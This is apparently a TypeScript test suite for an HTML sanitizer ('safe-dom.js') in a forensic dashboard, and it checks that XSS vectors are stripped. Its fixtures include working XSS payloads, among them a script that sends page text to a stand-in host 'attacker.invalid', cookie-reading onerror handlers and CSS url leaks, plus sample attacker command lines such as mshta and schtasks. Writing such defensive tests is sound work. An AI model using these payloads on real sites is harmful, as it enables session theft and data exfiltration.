import { readFileSync } from "node:fs";
import { readFile } from "node:fs/promises";
import { runInNewContext } from "node:vm";
import { describe, expect, it } from "vitest";

interface AttributeVerdict {
  name: string;
  value: string;
}

interface SafeDomApi {
  attributeAction(
    tagName: string,
    isSvg: boolean,
    name: string,
    value: string,
    fromScript?: boolean,
  ): AttributeVerdict | null;
  isSafeUrl(value: string, attribute: string, tagName: string): boolean;
  sanitizeCssText(value: string): string;
  precleanHtml(value: string): string;
}

async function loadApi(): Promise<SafeDomApi> {
  const source = await readFile(new URL("../../../public/js/safe-dom.js", import.meta.url), "utf8");
  const context: { DFIRSafeDOM?: SafeDomApi } = {};
  runInNewContext(source, context);
  if (!context.DFIRSafeDOM) throw new Error("safe-dom.js did not publish its testable API");
  return context.DFIRSafeDOM;
}

// The dashboard's esc() (public/js/dashboard-escape.js, present.html, mobile.html).
function esc(value: string): string {
  const map: Record<string, string> = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
  return value.replace(/[&<>"']/g, (c) => map[c]);
}

// Evidence and analyst text that the old attribute regexes deleted or rewrote on screen (#1787).
const MANGLED_EVIDENCE = [
  "<img src=x onerror=alert(2)> | pipe |",
  'powershell.exe -c "Start-Process x" onload=1',
  'cmdline: mshta.exe vbscript:Execute onclick="x"',
  "wmic process call create \"c:\\x.exe\" onerror='y'",
  "user typed: srcdoc=foo bar",
  "benign text with only=equals",
  "one=1 online=yes OneDrive=C:\\Users\\a\\OneDrive",
  'schtasks /create /tn x /tr "cmd /c evil" style=color:red',
  'note  STYLE = "background:url(https://example.com/x)" and ONLOAD = go',
];

// Raw markup an attacker can plant in an artifact name, command line or report field.
const RAW_XSS_FIXTURES = [
  '<img src=x onerror="alert(document.cookie)">',
  "<IMG SRC=x ONERROR=alert(1)>",
  '<script>fetch("https://attacker.invalid/"+document.body.innerText)</script>',
  '<svg><a href="javascript:alert(1)">artifact</a></svg>',
  '<svg onload="alert(1)"><rect onpointerenter="alert(2)"/></svg>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<div style="background:url(https://attacker.invalid/leak)">report field</div>',
  '<form action="https://attacker.invalid"><button formaction="javascript:alert(1)">x</button></form>',
];

// Test-only attribute reader for the fixtures above. The browser's parser is what the product uses.
function tagsOf(html: string): { tag: string; isSvg: boolean; attrs: [string, string][] }[] {
  const out: { tag: string; isSvg: boolean; attrs: [string, string][] }[] = [];
  let inSvg = false;
  for (const m of html.matchAll(/<(\/?)([a-z][a-z0-9]*)([^>]*)>/gi)) {
    const tag = m[2].toUpperCase();
    if (tag === "SVG") inSvg = m[1] !== "/";
    if (m[1] === "/") continue;
    const attrs: [string, string][] = [];
    for (const a of m[3].matchAll(/([^\s"'>\/=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+)))?/g)) {
      attrs.push([a[1], a[2] ?? a[3] ?? a[4] ?? ""]);
    }
    out.push({ tag, isSvg: inSvg || tag === "SVG", attrs });
  }
  return out;
}

describe("safe DOM policy — evidence text is never rewritten (#1787)", () => {
  it("leaves escaped evidence text byte-identical", async () => {
    const api = await loadApi();
    for (const text of MANGLED_EVIDENCE) {
      const html = `<td class="cell">${esc(text)}</td>`;
      expect(api.precleanHtml(html), text).toBe(html);
    }
  });

  it("leaves escaped evidence inside attribute values (tooltips) byte-identical", async () => {
    const api = await loadApi();
    for (const text of MANGLED_EVIDENCE) {
      const html = `<span title="${esc(text)}" data-cmd='${esc(text)}'>${esc(text)}</span>`;
      expect(api.precleanHtml(html), text).toBe(html);
    }
  });

  it("keeps an escaped tooltip value when the DOM walk judges the attribute", async () => {
    const api = await loadApi();
    for (const text of MANGLED_EVIDENCE) {
      expect(api.attributeAction("SPAN", false, "title", text)).toEqual({ name: "title", value: text });
    }
  });
});

describe("safe DOM policy — adversarial evidence fixtures", () => {
  it("strips blocked elements before the parser sees them", async () => {
    const api = await loadApi();
    for (const fixture of RAW_XSS_FIXTURES) {
      expect(api.precleanHtml(fixture).toLowerCase(), fixture).not.toMatch(/<script|<iframe/);
    }
  });

  it("drops or neutralizes every executable attribute in the raw fixtures", async () => {
    const api = await loadApi();
    for (const fixture of RAW_XSS_FIXTURES) {
      for (const { tag, isSvg, attrs } of tagsOf(api.precleanHtml(fixture))) {
        for (const [name, value] of attrs) {
          const verdict = api.attributeAction(tag, isSvg, name, value);
          if (!verdict) continue;
          const kept = `${verdict.name}=${verdict.value}`.toLowerCase();
          expect(kept, `${fixture} → ${name}`).not.toMatch(
            /^on|^srcdoc|^style=|^action|^formaction|javascript:|url\(/,
          );
        }
      }
    }
  });

  it("drops handler, srcdoc and form-target attributes in any case and namespace", async () => {
    const api = await loadApi();
    for (const name of [
      "onerror",
      "ONERROR",
      "OnLoad",
      "onpointerenter",
      "srcdoc",
      "SRCDOC",
      "action",
      "formaction",
      "srcset",
    ]) {
      expect(api.attributeAction("IMG", false, name, "alert(1)"), name).toBeNull();
      expect(api.attributeAction("RECT", true, name, "alert(1)"), name).toBeNull();
    }
    expect(api.attributeAction("A", false, "href", "javascript:alert(1)")).toBeNull();
    expect(api.attributeAction("A", false, "HREF", " jav\tascript:alert(1)")).toBeNull();
    expect(api.attributeAction("A", true, "href", "https://example.com/")).toBeNull();
  });

  it("turns style into sanitized data-safe-style and drops network CSS", async () => {
    const api = await loadApi();
    expect(api.attributeAction("DIV", false, "style", "color:red")).toEqual({
      name: "data-safe-style",
      value: "color:red",
    });
    expect(
      api.attributeAction("DIV", false, "STYLE", "background:url(https://attacker.invalid/x)"),
    ).toBeNull();
    expect(api.attributeAction("DIV", false, "data-safe-style", "width:expression(alert(1))")).toBeNull();
    expect(api.attributeAction("svg", true, "viewBox", "0 0 10 10")).toEqual({
      name: "viewBox",
      value: "0 0 10 10",
    });
  });

  it("rejects scriptable URLs but retains ordinary evidence and same-origin links", async () => {
    const api = await loadApi();
    expect(api.isSafeUrl("javascript:alert(1)", "href", "a")).toBe(false);
    expect(api.isSafeUrl("data:text/html,<script>alert(1)</script>", "href", "a")).toBe(false);
    expect(api.isSafeUrl("//attacker.invalid/leak", "src", "img")).toBe(false);
    expect(api.isSafeUrl("/cases/demo/evidence/screenshot.png", "src", "img")).toBe(true);
    expect(api.isSafeUrl("/sw.js", "src", "script")).toBe(true);
    expect(api.isSafeUrl("javascript:alert(1)", "src", "script")).toBe(false);
    expect(api.isSafeUrl("https://example.invalid/advisory", "href", "a")).toBe(true);
  });

  it("allows presentation CSS but drops CSS execution and network primitives", async () => {
    const api = await loadApi();
    expect(api.sanitizeCssText("display:none;color:var(--text-muted);width:42%")).toBe(
      "display:none;color:var(--text-muted);width:42%",
    );
    expect(api.sanitizeCssText("background:url(https://attacker.invalid/x);color:red")).toBe("color:red");
    expect(api.sanitizeCssText("width:expression(alert(1));position:fixed")).toBe("position:fixed");
  });
});

describe("safe DOM policy — CSS image functions fetch URLs too (#1811)", () => {
  it("drops image-set(), -webkit-image-set(), image(), src() and a nested cross-fade(image())", async () => {
    const api = await loadApi();
    for (const decl of [
      'background-image:image-set("https://attacker.invalid/a" 1x)',
      "background-image:-webkit-image-set('https://attacker.invalid/a' 1x)",
      'background:IMAGE-SET("https://attacker.invalid/a" 1x)',
      'list-style-image:image("https://attacker.invalid/a")',
      'background:cross-fade(image("https://attacker.invalid/a"),red)',
      'background-image:src("https://attacker.invalid/a")',
      "--leak:image-set('https://attacker.invalid/a' 1x)",
    ]) {
      expect(api.sanitizeCssText(`${decl};color:red`), decl).toBe("color:red");
    }
  });

  it("keeps gradients and image-named properties that fetch nothing", async () => {
    const api = await loadApi();
    const css = "background-image:linear-gradient(red,blue);border-image-width:2px;image-rendering:pixelated";
    expect(api.sanitizeCssText(css)).toBe(css);
  });
});

describe("safe DOM policy — backslash URLs are another origin (#1812)", () => {
  const OFF_ORIGIN = [
    "/\\attacker.invalid/x",
    "\\\\attacker.invalid/x",
    "\\/attacker.invalid/x",
    "/\t\\attacker.invalid/x",
    " \\attacker.invalid/x",
    "\\attacker.invalid/x",
  ];

  it("rejects a leading backslash in any mix with a slash", async () => {
    const api = await loadApi();
    for (const url of OFF_ORIGIN) {
      expect(api.isSafeUrl(url, "src", "img"), JSON.stringify(url)).toBe(false);
      expect(api.isSafeUrl(url, "href", "a"), JSON.stringify(url)).toBe(false);
      expect(api.isSafeUrl(url, "src", "script"), JSON.stringify(url)).toBe(false);
    }
  });

  it("still keeps same-origin paths and relative links", async () => {
    const api = await loadApi();
    for (const url of ["/cases/demo/x.png", "./x.png", "../x.png", "?q=1", "#top"]) {
      expect(api.isSafeUrl(url, "src", "img"), url).toBe(true);
    }
  });

  it("allows an external href only on an anchor", async () => {
    const api = await loadApi();
    expect(api.isSafeUrl("https://example.com/advisory", "href", "a")).toBe(true);
    expect(api.isSafeUrl("https://example.com/x.css", "href", "link")).toBe(false);
    expect(api.isSafeUrl("https://example.com/", "href", "base")).toBe(false);
    expect(api.isSafeUrl("https://example.com/x.svg#a", "href", "use")).toBe(false);
  });
});

// A minimal DOM, just enough for safe-dom.js to patch Element.prototype, so the setters can be
// driven without a browser. The Chromium/Firefox spec proves the same against a real parser.
function loadPatchedElement(): { make(tag: string, svg?: boolean): FakeElement } {
  const source = readFileSync(new URL("../../../public/js/safe-dom.js", import.meta.url), "utf8");
  class Element {
    attrs = new Map<string, string>();
    tagName = "DIV";
    namespaceURI = "http://www.w3.org/1999/xhtml";
    get innerHTML(): string {
      return "";
    }
    set innerHTML(_v: string) {}
    get outerHTML(): string {
      return "";
    }
    set outerHTML(_v: string) {}
    insertAdjacentHTML(): void {}
    setAttribute(name: string, value: unknown): void {
      this.attrs.set(name, String(value));
    }
    setAttributeNS(_ns: string | null, name: string, value: unknown): void {
      this.attrs.set(name, String(value));
    }
    removeAttribute(name: string): void {
      this.attrs.delete(name);
    }
  }
  const document = {
    readyState: "complete",
    documentElement: { classList: { add() {} } },
    querySelectorAll: () => [],
  };
  const context = { Element, document } as Record<string, unknown>;
  runInNewContext(source, context);
  return {
    make(tag, svg = false) {
      const el = new Element() as unknown as FakeElement;
      el.tagName = svg ? tag.toLowerCase() : tag.toUpperCase();
      el.namespaceURI = svg ? "http://www.w3.org/2000/svg" : "http://www.w3.org/1999/xhtml";
      return el;
    },
  };
}

interface FakeElement {
  attrs: Map<string, string>;
  tagName: string;
  namespaceURI: string;
  setAttribute(name: string, value: unknown): void;
  setAttributeNS(ns: string | null, name: string, value: unknown): void;
}

describe("safe DOM policy — script setters share the markup deny rules (#1813)", () => {
  const XLINK = "http://www.w3.org/1999/xlink";

  it("drops action, formaction, srcset, ping, background, srcdoc and handlers via setAttribute", () => {
    const dom = loadPatchedElement();
    for (const [tag, name, value] of [
      ["FORM", "action", "https://attacker.invalid/"],
      ["BUTTON", "formaction", "javascript:alert(1)"],
      ["IMG", "srcset", "https://attacker.invalid/x 1x"],
      ["A", "ping", "https://attacker.invalid/"],
      ["TABLE", "background", "https://attacker.invalid/x"],
      ["IFRAME", "srcdoc", "<script>alert(1)</script>"],
      ["IMG", "OnError", "alert(1)"],
      ["A", "href", "javascript:alert(1)"],
      ["IMG", "src", "/\\attacker.invalid/x"],
      ["LINK", "href", "https://attacker.invalid/x.css"],
    ]) {
      const el = dom.make(tag);
      el.setAttribute(name, value);
      expect([...el.attrs.keys()], `${tag} ${name}`).toEqual([]);
    }
  });

  it("drops the same attributes via setAttributeNS, judging XLink href by namespace not prefix", () => {
    const dom = loadPatchedElement();
    const a = dom.make("a", true);
    a.setAttributeNS(XLINK, "evil:href", "javascript:alert(1)");
    a.setAttributeNS(null, "formaction", "https://attacker.invalid/");
    a.setAttributeNS(null, "onclick", "alert(1)");
    expect([...a.attrs.keys()]).toEqual([]);
    const use = dom.make("use", true);
    use.setAttributeNS(XLINK, "xlink:href", "https://attacker.invalid/x.svg#a");
    expect([...use.attrs.keys()]).toEqual([]);
  });

  it("drops a remote SVG paint or clip reference but keeps a local one", () => {
    const dom = loadPatchedElement();
    const rect = dom.make("rect", true);
    rect.setAttribute("fill", "url(https://attacker.invalid/p.svg#g)");
    rect.setAttribute("clip-path", "url( 'https://attacker.invalid/c.svg#c')");
    expect([...rect.attrs.keys()]).toEqual([]);
    rect.setAttribute("cursor", "\\75rl(https://attacker.invalid/c.png), auto");
    rect.setAttribute("fill", "\\000075rl(https://attacker.invalid/p.svg#g)");
    rect.setAttribute("stroke", "image-set('https://attacker.invalid/s' 1x)");
    expect([...rect.attrs.keys()]).toEqual([]);
    rect.setAttribute("fill", "url(#grad)");
    rect.setAttribute("data-tip", "C:\\Windows\\Temp\\x.ps1");
    expect(rect.attrs.get("fill")).toBe("url(#grad)");
    expect(rect.attrs.get("data-tip")).toBe("C:\\Windows\\Temp\\x.ps1");
  });

  it("keeps the attributes app code and Leaflet set, with the caller's value", () => {
    const dom = loadPatchedElement();
    const path = dom.make("path", true);
    for (const [name, value] of [
      ["fill-rule", "evenodd"],
      ["pointer-events", "none"],
      ["stroke-dashoffset", "2"],
      ["d", "M0 0L1 1"],
      ["data-tip", "powershell -c onload=1"],
    ]) {
      path.setAttribute(name, value);
      expect(path.attrs.get(name), name).toBe(value);
    }
    const img = dom.make("IMG");
    img.setAttribute("src", "/cases/demo/x.png");
    img.setAttribute("aria-valuenow", null);
    expect(img.attrs.get("src")).toBe("/cases/demo/x.png");
    expect(img.attrs.get("aria-valuenow")).toBe("null");
  });

  it("drops a CSS-escaped remote reference in SVG markup too", async () => {
    const api = await loadApi();
    expect(api.attributeAction("RECT", true, "fill", "\\75rl(https://attacker.invalid/p)")).toBeNull();
    expect(api.attributeAction("RECT", true, "clip-path", "url(https://attacker.invalid/c#c)")).toBeNull();
    expect(api.attributeAction("RECT", true, "fill", "url(#grad)")).toEqual({
      name: "fill",
      value: "url(#grad)",
    });
  });

  it("markup and script paths agree on every denied attribute", async () => {
    const api = await loadApi();
    for (const name of ["action", "formaction", "srcset", "ping", "background", "srcdoc", "onclick"]) {
      expect(api.attributeAction("A", false, name, "x"), name).toBeNull();
      expect(api.attributeAction("A", false, name, "x", true), name).toBeNull();
    }
  });
});

describe("browser documents — governed rendering only", () => {
  const browserFiles = [
    "../../../public/dashboard.html",
    "../../../public/mobile.html",
    "../../../public/present.html",
    "../../../public/login.html",
    "../../../public/admin.html",
  ];

  it("loads the sink guard before application rendering code", async () => {
    for (const path of browserFiles) {
      const html = await readFile(new URL(path, import.meta.url), "utf8");
      const guard = html.indexOf('src="/js/safe-dom.js"');
      expect(guard, path).toBeGreaterThan(0);
      expect(guard, path).toBeLessThan(html.indexOf("<body"));
    }
  });

  it("contains no inline style or inline event-handler attributes", async () => {
    for (const path of browserFiles) {
      const html = await readFile(new URL(path, import.meta.url), "utf8");
      expect(
        [...html.matchAll(/\sstyle\s*=\s*["']/gi)].map((m) => m[0]),
        path,
      ).toEqual([]);
      expect(
        [...html.matchAll(/\son[a-z]+\s*=\s*["']/gi)].map((m) => m[0]),
        path,
      ).toEqual([]);
    }
  });

  it("nonces every inline script and stylesheet", async () => {
    for (const path of browserFiles) {
      const html = await readFile(new URL(path, import.meta.url), "utf8");
      const inlineScripts = [...html.matchAll(/<script(?![^>]*\ssrc=)[^>]*>/g)].map((m) => m[0]);
      const styles = [...html.matchAll(/<style[^>]*>/g)].map((m) => m[0]);
      for (const opener of [...inlineScripts, ...styles]) {
        expect(opener, `${path}: ${opener}`).toContain('nonce="__CSP_NONCE__"');
      }
    }
  });
});
